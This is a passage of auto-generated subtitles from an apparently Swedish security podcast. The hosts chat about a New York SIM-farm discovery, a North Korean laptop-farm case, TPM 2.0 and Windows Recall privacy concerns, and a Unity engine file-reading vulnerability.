`798 00:18:28,520 --> 00:18:29,740`
Var lite oklart för mig



`799 00:18:29,740 --> 00:18:29,940`
Men



`800 00:18:29,940 --> 00:18:30,700`
Det tycker jag också



`801 00:18:30,700 --> 00:18:31,720`
Det de säger här är



`802 00:18:31,720 --> 00:18:32,800`
Carrying out



`803 00:18:32,800 --> 00:18:33,520`
Anonymous



`804 00:18:33,520 --> 00:18:34,880`
Telephonic threats



`805 00:18:34,880 --> 00:18:36,060`
För det behöver man ju



`806 00:18:36,060 --> 00:18:37,720`
300 000 simkort till



`807 00:18:37,720 --> 00:18:38,480`
Det där är ju typ



`808 00:18:38,480 --> 00:18:39,340`
Såhär spam call



`809 00:18:39,340 --> 00:18:39,720`
Operation



`810 00:18:39,720 --> 00:18:41,100`
De kunde också



`811 00:18:41,100 --> 00:18:42,620`
En wide range



`812 00:18:42,620 --> 00:18:43,980`
Of telecommunication



`813 00:18:43,980 --> 00:18:44,540`
Attacks



`814 00:18:44,540 --> 00:18:45,720`
Och det tänkte jag vara



`815 00:18:45,720 --> 00:18:46,500`
Du skulle kunna göra



`816 00:18:46,500 --> 00:18:47,440`
Överbelastningstack



`817 00:18:47,440 --> 00:18:48,020`
Ja det var det



`818 00:18:48,020 --> 00:18:48,660`
Det var också såhär



`819 00:18:48,660 --> 00:18:49,760`
This includes



`820 00:18:49,760 --> 00:18:51,620`
Disabling cellphone towers



`821 00:18:51,620 --> 00:18:52,660`
Ja det måste ju vara överbelastningstack



`822 00:18:52,660 --> 00:18:54,280`
Enabling denial of service attacks



`823 00:18:54,280 --> 00:18:55,120`
And facilitating



`824 00:18:55,120 --> 00:18:57,160`
Anonymous encrypted communication



`825 00:18:57,160 --> 00:18:58,940`
Between potential threat actors



`826 00:18:58,940 --> 00:19:00,380`
And criminal enterprises



`827 00:19:00,380 --> 00:19:01,580`
För det var också en vinkel



`828 00:19:01,580 --> 00:19:02,260`
Jag hörde att



`829 00:19:02,260 --> 00:19:02,580`
Det här



`830 00:19:02,580 --> 00:19:03,800`
Vissa trodde att det här



`831 00:19:03,800 --> 00:19:04,320`
Bara var



`832 00:19:04,320 --> 00:19:05,960`
Ska vi kalla det



`833 00:19:05,960 --> 00:19:07,460`
Typ ett darknet



`834 00:19:07,460 --> 00:19:07,800`
Lite grann



`835 00:19:07,800 --> 00:19:08,440`
Alltså du använder



`836 00:19:08,440 --> 00:19:09,420`
Mobil infrastruktur



`837 00:19:09,420 --> 00:19:10,520`
Som finns där ute



`838 00:19:10,520 --> 00:19:11,540`
Och sen så kör du



`839 00:19:11,540 --> 00:19:13,260`
Dina egna kommunikationsstrukturer



`840 00:19:13,260 --> 00:19:13,740`
På det



`841 00:19:13,740 --> 00:19:14,420`
Bara stötsar



`842 00:19:14,420 --> 00:19:14,760`
Med sådana



`843 00:19:14,760 --> 00:19:16,560`
Ja de använder det



`844 00:19:16,560 --> 00:19:16,820`
Som ett



`845 00:19:16,820 --> 00:19:18,600`
Virtuellt nätverk



`846 00:19:18,600 --> 00:19:19,360`
Och så stötsar de



`847 00:19:19,360 --> 00:19:19,600`
Kommunikationstrukturerna



`848 00:19:19,760 --> 00:19:20,720`
Och det där emellan



`849 00:19:20,720 --> 00:19:22,140`
Det är tveta lådor



`850 00:19:22,140 --> 00:19:22,940`
Om man tittar på bilderna



`851 00:19:22,940 --> 00:19:23,200`
Ja



`852 00:19:23,200 --> 00:19:24,700`
Liksom det var



`853 00:19:24,700 --> 00:19:26,200`
Det var industriellt



`854 00:19:26,200 --> 00:19:26,740`
På riktigt



`855 00:19:26,740 --> 00:19:27,400`
Och jag menar



`856 00:19:27,400 --> 00:19:28,240`
Är det 300 locations



`857 00:19:28,240 --> 00:19:29,580`
Med 100 000 simkort



`858 00:19:29,580 --> 00:19:30,620`
Det är fan industriellt



`859 00:19:30,620 --> 00:19:31,000`
På riktigt



`860 00:19:31,000 --> 00:19:31,800`
Det kostar pengar



`861 00:19:31,800 --> 00:19:33,520`
Alltså bilderna var ju



`862 00:19:33,520 --> 00:19:34,740`
Det kändes lite som här



`863 00:19:34,740 --> 00:19:35,760`
Bitcoin mining



`864 00:19:35,760 --> 00:19:36,500`
Med grafikkort



`865 00:19:36,500 --> 00:19:37,560`
Liksom den typen



`866 00:19:37,560 --> 00:19:39,200`
Alltså du hyr en stor jävla lokal



`867 00:19:39,200 --> 00:19:40,440`
Och så fyller du den med



`868 00:19:40,440 --> 00:19:41,300`
Rack och



`869 00:19:41,300 --> 00:19:42,720`
Simkort och antenner



`870 00:19:42,720 --> 00:19:43,040`
Typ



`871 00:19:43,040 --> 00:19:44,540`
Det kanske bara var förberedelse



`872 00:19:44,540 --> 00:19:45,280`
För att fuska i



`873 00:19:45,280 --> 00:19:46,600`
Melodifestivalen



`874 00:19:46,600 --> 00:19:47,600`
Det är ju rimligt



`875 00:19:47,600 --> 00:19:48,720`
Ehm



`876 00:19:48,720 --> 00:19:49,720`
Ehm



`877 00:19:49,720 --> 00:19:50,600`
Nu ska vi se



`878 00:19:50,600 --> 00:19:52,280`
Early analysis indicates



`879 00:19:52,280 --> 00:19:53,300`
Cellular communications



`880 00:19:53,300 --> 00:19:54,660`
Between nation-state



`881 00:19:54,660 --> 00:19:55,700`
Threat actors



`882 00:19:55,700 --> 00:19:56,500`
And individuals



`883 00:19:56,500 --> 00:19:57,840`
That are known



`884 00:19:57,840 --> 00:19:59,320`
To federal law enforcement



`885 00:19:59,320 --> 00:19:59,960`
Att det var det



`886 00:19:59,960 --> 00:20:00,640`
Det användes till



`887 00:20:00,640 --> 00:20:02,680`
Och det här var kopplat till



`888 00:20:02,680 --> 00:20:03,860`
Ehm



`889 00:20:03,860 --> 00:20:04,740`
United Nations



`890 00:20:04,740 --> 00:20:05,760`
General Assembly



`891 00:20:05,760 --> 00:20:07,180`
Som skulle vara samtidigt



`892 00:20:07,180 --> 00:20:08,060`
I New York City



`893 00:20:08,060 --> 00:20:09,320`
Så det var väldigt oklart



`894 00:20:09,320 --> 00:20:10,080`
Exakt vad



`895 00:20:10,080 --> 00:20:10,400`
Men



`896 00:20:10,400 --> 00:20:11,680`
Det kändes som



`897 00:20:11,680 --> 00:20:13,060`
De hittade det här



`898 00:20:13,060 --> 00:20:14,240`
De gick ut med information



`899 00:20:14,240 --> 00:20:14,860`
Jävligt snabbt



`900 00:20:14,860 --> 00:20:15,720`
Och sen så kastade de lite



`901 00:20:15,720 --> 00:20:17,000`
Så här blandade grejer



`902 00:20:17,000 --> 00:20:18,000`
Som det skulle kunna vara



`903 00:20:18,000 --> 00:20:19,260`
Oklart om de



`904 00:20:19,260 --> 00:20:19,700`
Om de



`905 00:20:19,700 --> 00:20:20,760`
Om de själva inte riktigt vet



`906 00:20:20,760 --> 00:20:21,980`
Men tyckte det här var suspicious



`907 00:20:21,980 --> 00:20:22,920`
Eller om det är lite red hair



`908 00:20:22,920 --> 00:20:24,340`
Eller om de verkligen vet



`909 00:20:24,340 --> 00:20:25,260`
Och inte riktigt vill gå ut



`910 00:20:25,260 --> 00:20:26,280`
Med informationen



`911 00:20:26,280 --> 00:20:26,500`
Men



`912 00:20:26,500 --> 00:20:28,320`
Spännande findingen då



`913 00:20:28,320 --> 00:20:29,760`
Att någon har alltså byggt



`914 00:20:29,760 --> 00:20:31,220`
På 300 locations



`915 00:20:31,220 --> 00:20:31,920`
I New York



`916 00:20:31,920 --> 00:20:32,880`
Det lär ju inte vara billigt



`917 00:20:32,880 --> 00:20:33,220`
Bara det



`918 00:20:33,220 --> 00:20:33,660`
Det är ju också



`919 00:20:33,660 --> 00:20:34,220`
Jag funderar på



`920 00:20:34,220 --> 00:20:35,560`
Hur hittade de dem



`921 00:20:35,560 --> 00:20:36,520`
Okej jag köper att du



`922 00:20:36,520 --> 00:20:37,780`
Snubblar på en eller två



`923 00:20:37,780 --> 00:20:38,240`
Ja



`924 00:20:38,240 --> 00:20:40,100`
Du snubblar på 300 locations



`925 00:20:40,100 --> 00:20:41,220`
Men jag har ju hört



`926 00:20:41,220 --> 00:20:41,940`
Att det skulle vara



`927 00:20:41,940 --> 00:20:43,580`
Mer av en skamoperation



`928 00:20:43,580 --> 00:20:44,900`
Som en tjänst



`929 00:20:44,900 --> 00:20:45,640`
Att man säljer infrastruktur



`930 00:20:45,640 --> 00:20:46,740`
Ja men typ robocalls



`931 00:20:46,740 --> 00:20:47,940`
Den typen av grejer



`932 00:20:47,940 --> 00:20:47,960`
Exakt



`933 00:20:47,960 --> 00:20:48,540`
Och distribuerar



`934 00:20:48,540 --> 00:20:49,740`
Alltså att det var en tjänst



`935 00:20:49,740 --> 00:20:51,240`
Rätt organiserat ändå



`936 00:20:51,240 --> 00:20:52,820`
100 000 simkort



`937 00:20:52,820 --> 00:20:53,700`
Ja precis



`938 00:20:53,700 --> 00:20:54,000`
Det är ju



`939 00:20:54,000 --> 00:20:55,280`
Det är ju också något



`940 00:20:55,280 --> 00:20:56,560`
Vi skulle ta in någon



`941 00:20:56,560 --> 00:20:57,720`
Som är bra på det här



`942 00:20:57,720 --> 00:20:58,260`
Med just



`943 00:20:58,260 --> 00:21:00,380`
Alltså hur



`944 00:21:00,380 --> 00:21:01,840`
Jävla värdelöst



`945 00:21:01,840 --> 00:21:02,700`
Telefoni är



`946 00:21:02,700 --> 00:21:04,040`
Utifrån



`947 00:21:04,040 --> 00:21:05,100`
Utav ett verifikation



`948 00:21:05,100 --> 00:21:05,400`
Och autoritet



`949 00:21:05,400 --> 00:21:06,360`
Typ såhär sim swapping



`950 00:21:06,360 --> 00:21:07,600`
Ja det är ju också



`951 00:21:07,600 --> 00:21:08,340`
Väldigt intressant



`952 00:21:08,340 --> 00:21:09,060`
Men vad är uppsidan



`953 00:21:09,060 --> 00:21:09,780`
På sån här grej då



`954 00:21:09,780 --> 00:21:10,200`
Nu okej



`955 00:21:10,200 --> 00:21:11,260`
Uppsidan på det här



`956 00:21:11,260 --> 00:21:12,220`
Är att vem som helst



`957 00:21:12,220 --> 00:21:12,980`
Skulle kunna köpa



`958 00:21:12,980 --> 00:21:13,840`
Ett svenskt telefonnummer



`959 00:21:13,840 --> 00:21:14,260`
Till exempel



`960 00:21:14,260 --> 00:21:15,780`
Ja



`961 00:21:15,780 --> 00:21:16,820`
Det är inte kanon



`962 00:21:16,820 --> 00:21:18,500`
Och då plugga in



`963 00:21:18,500 --> 00:21:20,400`
Eller köpa en svensk nummerserie



`964 00:21:20,400 --> 00:21:21,060`
Och plugga in det



`965 00:21:21,060 --> 00:21:21,680`
I den här grejen



`966 00:21:21,680 --> 00:21:24,060`
Man kör ett IP-koppel



`967 00:21:24,060 --> 00:21:25,080`
Voice over IP



`968 00:21:25,080 --> 00:21:25,760`
Och sen så



`969 00:21:25,760 --> 00:21:26,940`
Fast i ändan



`970 00:21:26,940 --> 00:21:28,140`
Så blir det en mobiltelefon



`971 00:21:28,140 --> 00:21:28,380`
Ja



`972 00:21:28,380 --> 00:21:29,480`
Och sen har man den här



`973 00:21:29,480 --> 00:21:30,920`
Distribuerad över många lokationer



`974 00:21:30,920 --> 00:21:31,460`
Så vart kommer



`975 00:21:31,460 --> 00:21:32,300`
Samtalet ifrån



`976 00:21:32,300 --> 00:21:33,920`
Någonstans ifrån



`977 00:21:33,920 --> 00:21:34,540`
It's coming from



`978 00:21:34,540 --> 00:21:35,420`
Inside the house



`979 00:21:35,420 --> 00:21:35,860`
Exakt



`980 00:21:35,860 --> 00:21:36,620`
Manhattan



`981 00:21:36,620 --> 00:21:37,660`
Kul finding i alla fall



`982 00:21:37,660 --> 00:21:38,020`
Och som sagt



`983 00:21:38,020 --> 00:21:39,100`
Det finns bilder och skit



`984 00:21:39,100 --> 00:21:41,460`
Det ser powerful ut



`985 00:21:41,460 --> 00:21:42,200`
Ingenting



`986 00:21:42,200 --> 00:21:42,620`
Vissa



`987 00:21:42,620 --> 00:21:44,100`
Och det var väldigt olika



`988 00:21:44,100 --> 00:21:45,560`
I de olika locations också



`989 00:21:45,560 --> 00:21:46,320`
För att vissa var



`990 00:21:46,320 --> 00:21:47,620`
Extremt organiserade



`991 00:21:47,620 --> 00:21:48,420`
Andra som



`992 00:21:48,500 --> 00:21:49,000`
Ser ut som



`993 00:21:49,000 --> 00:21:50,060`
Bengt Göran



`994 00:21:50,060 --> 00:21:50,820`
Köpte ett par prylar



`995 00:21:50,820 --> 00:21:51,620`
Och kopplade ihop dem



`996 00:21:51,620 --> 00:21:52,160`
Det vet man ju



`997 00:21:52,160 --> 00:21:53,260`
Bengt Göran har ingen koll



`998 00:21:53,260 --> 00:21:53,920`
På sina kablar



`999 00:21:53,920 --> 00:21:54,620`
Nej nej



`1000 00:21:54,620 --> 00:21:55,900`
Det är noll struktur



`1001 00:21:55,900 --> 00:21:57,060`
Medan andra är liksom



`1002 00:21:57,060 --> 00:21:58,760`
Feta rack längs väggarna



`1003 00:21:58,760 --> 00:21:59,840`
Och du ser knappt



`1004 00:21:59,840 --> 00:22:00,300`
Hur långt de



`1005 00:22:00,300 --> 00:22:01,720`
Ja det är mäktigt



`1006 00:22:01,720 --> 00:22:03,400`
Nu kanske det inte har



`1007 00:22:03,400 --> 00:22:03,920`
Någon som helst



`1008 00:22:03,920 --> 00:22:05,260`
Koppling till det här



`1009 00:22:05,260 --> 00:22:05,540`
Men



`1010 00:22:05,540 --> 00:22:07,740`
För några månader sedan



`1011 00:22:07,740 --> 00:22:08,480`
Så var det ju



`1012 00:22:08,480 --> 00:22:10,640`
En kvinna som grep



`1013 00:22:10,640 --> 00:22:11,340`
Som hade liksom



`1014 00:22:11,340 --> 00:22:11,840`
Hennes hem



`1015 00:22:11,840 --> 00:22:12,860`
Var ju fyllt med



`1016 00:22:12,860 --> 00:22:13,760`
Laptops



`1017 00:22:13,760 --> 00:22:15,760`
För hon



`1018 00:22:15,760 --> 00:22:16,800`
Hade ju alla



`1019 00:22:16,800 --> 00:22:18,060`
Fjärrarbetare



`1020 00:22:18,060 --> 00:22:18,480`
Som



`1021 00:22:18,500 --> 00:22:20,940`
Alla bodde hos henne



`1022 00:22:20,940 --> 00:22:21,760`
Virtuellt



`1023 00:22:21,760 --> 00:22:22,920`
Alla bodde hos henne



`1024 00:22:22,920 --> 00:22:23,400`
Och så



`1025 00:22:23,400 --> 00:22:24,660`
Och så



`1026 00:22:24,660 --> 00:22:25,820`
Bara var många



`1027 00:22:25,820 --> 00:22:26,860`
IP-kopplingar



`1028 00:22:26,860 --> 00:22:27,700`
Från Nordkorea



`1029 00:22:27,700 --> 00:22:28,800`
Till hennes hem



`1030 00:22:28,800 --> 00:22:29,480`
Av någon anledning



`1031 00:22:29,480 --> 00:22:30,260`
Damn



`1032 00:22:30,260 --> 00:22:31,780`
Så det kan vara



`1033 00:22:31,780 --> 00:22:32,440`
Något sånt



`1034 00:22:32,440 --> 00:22:33,960`
Eller någonting annat



`1035 00:22:33,960 --> 00:22:36,040`
Ja de fuffen



`1036 00:22:36,040 --> 00:22:36,640`
Säger det i alla fall



`1037 00:22:36,640 --> 00:22:37,300`
Spenande



`1038 00:22:37,300 --> 00:22:37,880`
Men



`1039 00:22:37,880 --> 00:22:39,240`
Rickard



`1040 00:22:39,240 --> 00:22:39,740`
Ja



`1041 00:22:39,740 --> 00:22:40,340`
Du snackade lite



`1042 00:22:40,340 --> 00:22:40,780`
TPM



`1043 00:22:40,780 --> 00:22:41,720`
Ja precis



`1044 00:22:41,720 --> 00:22:42,120`
Eller



`1045 00:22:42,120 --> 00:22:44,240`
Privacy egentligen



`1046 00:22:44,240 --> 00:22:44,500`
Ja



`1047 00:22:44,500 --> 00:22:46,560`
Och det är inte



`1048 00:22:46,560 --> 00:22:47,780`
Jag som har kommit på det här



`1049 00:22:47,780 --> 00:22:48,340`
Eller sådär



`1050 00:22:48,340 --> 00:22:49,600`
Utan jag har ju nosat upp det



`1051 00:22:49,600 --> 00:22:50,280`
För jag har



`1052 00:22:50,280 --> 00:22:51,380`
Knackat Youtube



`1053 00:22:51,380 --> 00:22:53,120`
Men



`1054 00:22:53,120 --> 00:22:54,720`
Rob Braxman



`1055 00:22:54,720 --> 00:22:56,120`
Som är en



`1056 00:22:56,120 --> 00:22:58,580`
Förespråkare för



`1057 00:22:58,580 --> 00:23:01,260`
Privacy online



`1058 00:23:01,260 --> 00:23:02,840`
Har ju



`1059 00:23:02,840 --> 00:23:04,720`
Gjort en rent video



`1060 00:23:04,720 --> 00:23:05,880`
Som är ganska intressant



`1061 00:23:05,880 --> 00:23:07,500`
Jag har gjort flera rent videos



`1062 00:23:07,500 --> 00:23:07,740`
Men



`1063 00:23:07,740 --> 00:23:08,820`
Men just kring



`1064 00:23:08,820 --> 00:23:09,780`
Windows 11



`1065 00:23:09,780 --> 00:23:10,420`
Och



`1066 00:23:10,420 --> 00:23:12,220`
Dess intåg



`1067 00:23:12,220 --> 00:23:12,640`
Att



`1068 00:23:12,640 --> 00:23:14,560`
Det kräver



`1069 00:23:14,560 --> 00:23:15,780`
TPM 2.0



`1070 00:23:15,780 --> 00:23:17,760`
Och han har ju



`1071 00:23:17,760 --> 00:23:17,820`
Synpunkter på det här



`1072 00:23:18,340 --> 00:23:20,640`
Dels för att



`1073 00:23:20,640 --> 00:23:21,920`
Det skapar issues



`1074 00:23:21,920 --> 00:23:23,200`
När han vill installera Ubuntu



`1075 00:23:23,200 --> 00:23:24,480`
På sina nya maskiner



`1076 00:23:24,480 --> 00:23:25,500`
Och sådana här saker



`1077 00:23:25,500 --> 00:23:26,780`
Det är hoops and loops



`1078 00:23:26,780 --> 00:23:27,820`
Han måste hoppa igenom



`1079 00:23:27,820 --> 00:23:28,580`
Och plötsligt så



`1080 00:23:28,580 --> 00:23:29,860`
Låses alltihop



`1081 00:23:29,860 --> 00:23:31,400`
Och så får man börja om från början



`1082 00:23:31,400 --> 00:23:31,900`
Ja



`1083 00:23:31,900 --> 00:23:33,180`
Men



`1084 00:23:33,180 --> 00:23:34,720`
Det han



`1085 00:23:34,720 --> 00:23:36,260`
Lyfter fram



`1086 00:23:36,260 --> 00:23:38,560`
Som är lite scary kring



`1087 00:23:38,560 --> 00:23:39,840`
Kombinationen då



`1088 00:23:39,840 --> 00:23:41,640`
Windows 11 och



`1089 00:23:41,640 --> 00:23:44,460`
TPM 2.0 ur ett privacy perspektiv



`1090 00:23:44,460 --> 00:23:45,980`
Är ju de här



`1091 00:23:45,980 --> 00:23:47,680`
Ska man säga inbrända



`1092 00:23:47,680 --> 00:23:50,240`
Alltså hårt inbrända RSA nyckeln då



`1093 00:23:50,240 --> 00:23:51,260`
Som kallas för



`1094 00:23:51,260 --> 00:23:51,780`
EK



`1095 00:23:51,780 --> 00:23:54,340`
Det är en



`1096 00:23:54,340 --> 00:23:55,200`
Så kallad



`1097 00:23:55,200 --> 00:23:56,520`
Endorsement key



`1098 00:23:56,520 --> 00:23:58,320`
Den är alltså



`1099 00:23:58,320 --> 00:24:00,820`
Hårt bränd i chipet



`1100 00:24:00,820 --> 00:24:01,300`
Och



`1101 00:24:01,300 --> 00:24:04,200`
Kan då användas för att



`1102 00:24:04,200 --> 00:24:06,220`
Koppla en fysisk hårdvara



`1103 00:24:06,220 --> 00:24:07,900`
Till någonting som



`1104 00:24:07,900 --> 00:24:08,880`
Händer



`1105 00:24:08,880 --> 00:24:11,240`
Och den här



`1106 00:24:11,240 --> 00:24:12,820`
Typ loggar och sånt då



`1107 00:24:12,820 --> 00:24:13,860`
Ja precis



`1108 00:24:13,860 --> 00:24:16,080`
Man kan via



`1109 00:24:16,080 --> 00:24:17,660`
API



`1110 00:24:17,680 --> 00:24:20,240`
Ställa frågor till



`1111 00:24:20,240 --> 00:24:21,000`
De här



`1112 00:24:21,000 --> 00:24:23,060`
Platform configuration registers



`1113 00:24:23,060 --> 00:24:24,080`
Som då



`1114 00:24:24,600 --> 00:24:26,120`
Bland annat kan



`1115 00:24:26,120 --> 00:24:27,920`
Och det här är ju saker som man



`1116 00:24:27,920 --> 00:24:29,200`
Kanske vill göra om man är



`1117 00:24:30,480 --> 00:24:31,240`
En bank



`1118 00:24:31,500 --> 00:24:32,780`
Att liksom man



`1119 00:24:32,780 --> 00:24:33,800`
Ja men det här är en



`1120 00:24:33,800 --> 00:24:34,580`
Betrod enhet



`1121 00:24:34,580 --> 00:24:35,340`
Eller någonting



`1122 00:24:35,340 --> 00:24:36,120`
Ja det var det jag var ute efter



`1123 00:24:36,120 --> 00:24:37,900`
Okej det är som



`1124 00:24:37,900 --> 00:24:39,440`
Device management i en enterprise



`1125 00:24:39,440 --> 00:24:40,980`
Du skjuter ner ett sätt liksom



`1126 00:24:40,980 --> 00:24:43,280`
Ja fast det här är fastbränt i TPM chipet



`1127 00:24:43,280 --> 00:24:45,080`
Och går inte att radera



`1128 00:24:45,080 --> 00:24:47,380`
Och det får ju såklart



`1129 00:24:47,680 --> 00:24:49,220`
Implikationer



`1130 00:24:49,220 --> 00:24:50,500`
För



`1131 00:24:50,500 --> 00:24:52,280`
Om du vill hålla dig anonym



`1132 00:24:52,280 --> 00:24:54,600`
Det vill säga det hjälper inte att ha dual boot



`1133 00:24:54,600 --> 00:24:56,640`
Plötsligt utan



`1134 00:24:56,640 --> 00:24:57,400`
Det är liksom



`1135 00:24:57,400 --> 00:24:58,440`
I samma burk ändå



`1136 00:24:58,440 --> 00:25:00,220`
Det är i samma burk ändå



`1137 00:25:00,220 --> 00:25:01,500`
Sen



`1138 00:25:01,500 --> 00:25:02,280`
Ja



`1139 00:25:02,280 --> 00:25:03,800`
Fråga Peter



`1140 00:25:03,800 --> 00:25:05,860`
Ja centralt för



`1141 00:25:05,860 --> 00:25:09,180`
När man diskuterar privacy preserving



`1142 00:25:09,180 --> 00:25:10,980`
Hardware rooted



`1143 00:25:10,980 --> 00:25:12,000`
Grejer



`1144 00:25:12,000 --> 00:25:14,040`
Är ju just hur



`1145 00:25:14,040 --> 00:25:16,360`
Hur säkrar du att



`1146 00:25:17,680 --> 00:25:19,220`
Du inte kan göra den här kopplingen



`1147 00:25:19,980 --> 00:25:23,820`
Och i den klassiska TPM-arkitekturen så har du ju alltså



`1148 00:25:25,880 --> 00:25:29,460`
Du har ju en privacy certificate authority som du



`1149 00:25:29,720 --> 00:25:30,480`
Litar på



`1150 00:25:31,500 --> 00:25:33,300`
Den får ju



`1151 00:25:33,560 --> 00:25:34,320`
Din



`1152 00:25:34,840 --> 00:25:36,360`
TPM-identitet



`1153 00:25:37,400 --> 00:25:38,920`
Och så byter den



`1154 00:25:39,180 --> 00:25:40,200`
Så att du får



`1155 00:25:40,200 --> 00:25:42,000`
Du får ett privacy CA



`1156 00:25:42,760 --> 00:25:47,120`
Eller ett privacy cert som du sedan använder i kommunikationer eller där



`1157 00:25:47,680 --> 00:25:50,500`
Det innebär ju då naturligtvis att du



`1158 00:25:50,500 --> 00:25:53,320`
Litar ju på privacy CA



`1159 00:25:53,560 --> 00:25:56,120`
Och faktiskt respekterar din privacy om den



`1160 00:25:56,640 --> 00:26:00,220`
Hela tiden behåller en koppling mellan



`1161 00:26:01,240 --> 00:26:02,520`
Faktisk



`1162 00:26:02,780 --> 00:26:04,060`
TPM-identitet



`1163 00:26:05,080 --> 00:26:06,360`
Och den



`1164 00:26:06,880 --> 00:26:09,440`
Privacy skyddande identiteten



`1165 00:26:09,960 --> 00:26:13,540`
Då funkar ju inte det här men det är ju en



`1166 00:26:14,560 --> 00:26:17,380`
Det är en väldigt välkänd



`1167 00:26:17,680 --> 00:26:22,040`
Alltså grundgrej i TPM-arkitekturen för



`1168 00:26:22,540 --> 00:26:24,600`
När du inte fasar emot liksom att



`1169 00:26:24,840 --> 00:26:28,940`
Du måste ha en privacy CA som du



`1170 00:26:29,200 --> 00:26:30,740`
Litar på att den



`1171 00:26:31,000 --> 00:26:32,520`
Är privacy preserving



`1172 00:26:32,780 --> 00:26:35,080`
Annars går det helt sådär



`1173 00:26:35,340 --> 00:26:38,160`
Det finns till och med på min git



`1174 00:26:38,420 --> 00:26:43,020`
Finns det lite koden, en liten illustration av hur privacy CA funkar som är



`1175 00:26:44,040 --> 00:26:47,120`
Hyfsat mycket stulet från ett stort projekt men



`1176 00:26:47,120 --> 00:26:51,480`
Men det finns ett antal som starar och gillar den just för att det är



`1177 00:26:52,500 --> 00:26:58,640`
Sjukt mycket kod och krångligt om du går i sådana här riktiga projekt och ska försöka hitta det men



`1178 00:26:58,900 --> 00:26:59,920`
Men just den lilla



`1179 00:27:00,940 --> 00:27:05,800`
Grejse där för hur det där går till har jag rippat ut i ett projekt en gång i tiden



`1180 00:27:06,840 --> 00:27:11,700`
En annan implikation kring det här det är ju kombinationen då som



`1181 00:27:11,960 --> 00:27:14,760`
Just med Windows 11 och



`1182 00:27:15,020 --> 00:27:16,560`
Windows Recall



`1183 00:27:17,120 --> 00:27:18,400`
Vars co-pilot



`1184 00:27:18,660 --> 00:27:20,960`
Som hela tiden tar screenshots av dig



`1185 00:27:21,220 --> 00:27:22,500`
Lagrar det lokalt



`1186 00:27:22,760 --> 00:27:25,560`
Skyddat av ditt TPM-chip



`1187 00:27:27,880 --> 00:27:31,200`
Man kan kanske ta det här med en liten nypa salt



`1188 00:27:31,460 --> 00:27:33,760`
Vad fan gör TPM skyddet för att skydda det?



`1189 00:27:34,020 --> 00:27:36,580`
Det låter verkligen som en plumpa äron



`1190 00:27:36,840 --> 00:27:37,860`
Grejen är att



`1191 00:27:38,120 --> 00:27:42,980`
Det ska ju vara krypterat och skyddat och bara användas lokalt men



`1192 00:27:43,240 --> 00:27:47,080`
Via API-calls så kan man då ställa en fråga till



`1193 00:27:47,380 --> 00:27:49,940`
Co-pilot som då har tillgång till de här



`1194 00:27:51,220 --> 00:27:52,500`
Screenshotsen till exempel



`1195 00:27:53,000 --> 00:27:56,600`
Så att Rickard då jobbade eller tittade han på Pornhub hela



`1196 00:27:56,840 --> 00:27:57,620`
Dagen igår



`1197 00:27:57,880 --> 00:27:58,900`
Det vet vi redan



`1198 00:27:59,160 --> 00:27:59,660`
Ja det är klart



`1199 00:28:00,940 --> 00:28:03,760`
Nej men det är



`1200 00:28:04,020 --> 00:28:08,620`
Jag tycker att det är värt att lyssna på och sen kan man fundera på



`1201 00:28:09,140 --> 00:28:10,680`
Vart vi är på väg



`1202 00:28:11,180 --> 00:28:15,020`
I form av övervakningssamhälle och



`1203 00:28:15,280 --> 00:28:16,560`
Om man vill vara



`1204 00:28:16,560 --> 00:28:17,840`
Anonym online



`1205 00:28:18,100 --> 00:28:23,980`
Jag är faktiskt lite förvånad över att Microsoft har kommit undan med Windows 11 och den extrema telemetrin de skickar runt



`1206 00:28:24,240 --> 00:28:25,520`
Alltså folk bitchar ju om det



`1207 00:28:25,780 --> 00:28:28,340`
Men liksom det är inte mer än gnäll



`1208 00:28:29,620 --> 00:28:30,900`
Sen är det väl så



`1209 00:28:31,160 --> 00:28:33,200`
Okej om man nu är



`1210 00:28:33,460 --> 00:28:36,780`
En privacy-person då får man ju bara hålla sig borta från Windows om man löser det



`1211 00:28:37,040 --> 00:28:38,320`
Ja det är väl



`1212 00:28:38,580 --> 00:28:39,860`
Steg 1a



`1213 00:28:40,620 --> 00:28:44,460`
Det var också rätt kul häromdagen på Toronto Privacy Survey så häromdagen så



`1214 00:28:44,720 --> 00:28:46,260`
En snubbe en vanlig människa



`1215 00:28:46,560 --> 00:28:48,860`
Alltså inte en klassisk it eller it-säkerhetsnörd



`1216 00:28:49,120 --> 00:28:51,160`
Som pratade med mig om att



`1217 00:28:51,420 --> 00:28:53,480`
Han tänkte gå över till Graphene OS



`1218 00:28:53,720 --> 00:28:55,520`
På sin Android-telefon



`1219 00:28:55,780 --> 00:28:57,560`
Och han hade fan gjort sin hemläxa kan jag säga



`1220 00:28:57,820 --> 00:28:58,840`
Den dude hade koll



`1221 00:28:59,100 --> 00:29:01,160`
Och det tyckte jag var jätteroligt liksom att det



`1222 00:29:01,660 --> 00:29:05,760`
Det var inte den människan jag trodde skulle komma farande med sådana grejer



`1223 00:29:06,280 --> 00:29:07,040`
På tal om privacy då



`1224 00:29:08,840 --> 00:29:09,340`
Det är nice



`1225 00:29:09,600 --> 00:29:10,120`
Peter



`1226 00:29:10,620 --> 00:29:11,400`
Vad kallade du Unity?



`1227 00:29:12,160 --> 00:29:16,000`
Ja Unity kom



`1228 00:29:16,560 --> 00:29:17,840`
Unity pratar vi om, pratar vi om



`1229 00:29:18,100 --> 00:29:19,380`
Spelmotorn Unity



`1230 00:29:19,640 --> 00:29:21,160`
Spelmotorn Unity ja



`1231 00:29:23,980 --> 00:29:27,560`
I första vågen så gick det ut typ



`1232 00:29:27,820 --> 00:29:29,620`
Det kommer komma något från Unity



`1233 00:29:29,880 --> 00:29:32,180`
Alla ska ha



`1234 00:29:32,940 --> 00:29:34,480`
Sit fucking ready liksom



`1235 00:29:34,740 --> 00:29:36,780`
Och sen



`1236 00:29:37,560 --> 00:29:40,360`
Så släppte Unity sin fix



`1237 00:29:41,640 --> 00:29:43,960`
Och det innebär ju alltså att



`1238 00:29:44,200 --> 00:29:46,520`
Alla spel på Steam och allt annat



`1239 00:29:46,820 --> 00:29:47,580`
Måste uppdateras



`1240 00:29:49,640 --> 00:29:51,940`
Så jag tänker att Steam och andra



`1241 00:29:52,700 --> 00:29:57,060`
Det har ju fått en del utilization där med mycket utdateringar som skulle ut



`1242 00:29:57,560 --> 00:29:59,100`
Vad var problemet?



`1243 00:30:02,940 --> 00:30:05,240`
Osäker



`1244 00:30:05,500 --> 00:30:07,300`
Filläsning som



`1245 00:30:08,060 --> 00:30:10,880`
Till exempel kan leda till



`1246 00:30:11,900 --> 00:30:14,720`
Local file inclusion



`1247 00:30:14,980 --> 00:30:16,520`
Om man parsar den här texten



